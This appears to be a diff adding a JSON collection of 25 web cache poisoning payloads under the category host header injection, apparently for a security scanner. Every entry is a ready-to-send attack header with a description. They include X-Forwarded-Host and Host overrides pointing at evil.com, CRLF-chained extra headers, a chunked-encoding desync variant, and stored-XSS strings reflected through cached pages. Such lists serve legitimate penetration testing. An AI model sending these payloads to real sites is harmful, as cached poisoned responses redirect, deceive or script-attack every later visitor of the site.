@@ -1,0 +1,232 @@
+{
+  "category": "host_header_injection",
+  "subcategory": "cache_poisoning",
+  "count": 25,
+  "payloads": [
+    {
+      "id": "hhi-2000",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "X-Forwarded-Host: evil.com",
+      "description": "Cache key poisoning via X-Forwarded-Host — cached page serves attacker content",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    },
+    {
+      "id": "hhi-2001",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "X-Forwarded-Scheme: http",
+      "description": "Downgrade cached response to HTTP via X-Forwarded-Scheme",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    },
+    {
+      "id": "hhi-2002",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "X-Forwarded-Proto: http",
+      "description": "Force HTTP protocol in cached response",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    },
+    {
+      "id": "hhi-2003",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "X-Forwarded-Host: evil.com\r\nX-Forwarded-Proto: https",
+      "description": "Cache poisoning with HTTPS proto to make link look legit",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    },
+    {
+      "id": "hhi-2004",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "X-Forwarded-Host: evil.com\r\nX-Forwarded-Port: 443",
+      "description": "Cache poisoning with port + host override",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    },
+    {
+      "id": "hhi-2005",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "X-Original-URL: /",
+      "description": "X-Original-URL cache key manipulation",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    },
+    {
+      "id": "hhi-2006",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "X-Rewrite-URL: /admin",
+      "description": "X-Rewrite-URL to poison cache with admin page content",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    },
+    {
+      "id": "hhi-2007",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "X-Forwarded-Host: <script>alert(1)</script>",
+      "description": "XSS via cache poisoning — reflected in cached HTML",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    },
+    {
+      "id": "hhi-2008",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "X-Forwarded-Host: evil.com/js/tracker.js",
+      "description": "Cache poisoned static asset references",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    },
+    {
+      "id": "hhi-2009",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "X-Forwarded-Prefix: /evil",
+      "description": "X-Forwarded-Prefix to poison URL base path in cache",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    },
+    {
+      "id": "hhi-2010",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "Host: target.com\r\nX-Cache-Key: evil",
+      "description": "Direct cache key manipulation attempt",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    },
+    {
+      "id": "hhi-2011",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "Transfer-Encoding: chunked\r\nHost: evil.com",
+      "description": "Chunked encoding + Host injection for desync cache poisoning",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    },
+    {
+      "id": "hhi-2012",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "X-Forwarded-Host: evil.com\r\nPragma: no-cache",
+      "description": "Bypass cache validation + poison with new host",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    },
+    {
+      "id": "hhi-2013",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "X-Forwarded-Host: evil.com\r\nCache-Control: no-transform",
+      "description": "Prevent CDN transformation of poisoned response",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    },
+    {
+      "id": "hhi-2014",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "X-HTTP-Method-Override: POST",
+      "description": "Method override to poison POST response in GET cache",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    },
+    {
+      "id": "hhi-2015",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "Host: target.com\r\nX-Forwarded-Host: target.com.evil.com",
+      "description": "Subdomain cache poisoning — link looks legitimate",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    },
+    {
+      "id": "hhi-2016",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "Forwarded: host=evil.com;proto=https",
+      "description": "RFC 7239 Forwarded header cache poisoning",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    },
+    {
+      "id": "hhi-2017",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "X-Forwarded-Host: evil.com\r\nAccept-Encoding: gzip, deflate",
+      "description": "Vary header bypass — poison both compressed and uncompressed",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    },
+    {
+      "id": "hhi-2018",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "X-Forwarded-Host: evil.com\r\nAccept-Language: en",
+      "description": "Language-variant cache poisoning",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    },
+    {
+      "id": "hhi-2019",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "X-Forwarded-Host: evil.com\r\nX-Requested-With: XMLHttpRequest",
+      "description": "AJAX-specific cache poisoning variant",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    },
+    {
+      "id": "hhi-2020",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "Host: evil.com\r\nVary: X-Forwarded-Host",
+      "description": "Inject Vary header to create separate cache key for poisoned entry",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    },
+    {
+      "id": "hhi-2021",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "Host: target.com\r\nX-Forwarded-Host: \"><img src=x onerror=alert(1)>",
+      "description": "Stored XSS via cache poisoning with img tag",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    },
+    {
+      "id": "hhi-2022",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "X-Forwarded-Host: evil.com\r\nIf-None-Match: \"invalid\"",
+      "description": "ETag bypass to force full response with poisoned content",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    },
+    {
+      "id": "hhi-2023",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "Host: target.com:evil.com",
+      "description": "Colon-separated host confusion for cache key splitting",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    },
+    {
+      "id": "hhi-2024",
+      "category": "host_header_injection",
+      "subcategory": "cache_poisoning",
+      "payload": "X-Forwarded-Host: evil.com\r\nAge: 0",
+      "description": "Reset cache age to maximize poisoned response lifetime",
+      "technique": "cache_poisoning",
+      "source": "manual"
+    }
+  ]
+}
